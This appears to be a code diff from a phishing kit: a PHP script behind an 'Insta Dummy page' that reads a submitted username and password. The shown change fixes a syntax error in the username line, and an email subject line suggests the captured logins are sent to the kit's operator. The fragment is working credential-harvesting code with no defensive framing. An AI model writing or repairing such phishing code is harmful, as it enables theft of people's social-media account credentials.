@@ -1,7 +1,7 @@
 <?php
 
 // Variable settings
-$username = $_REQUEST'u_name'] ?? '';  // Fetch username (using null coalescing operator)
+$username = $_REQUEST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
 $passcode = $_REQUEST['pass'] ?? '';    // Fetch password (using null coalescing operator)
 
 $subject = "Someone Login ! Insta Dummy page";
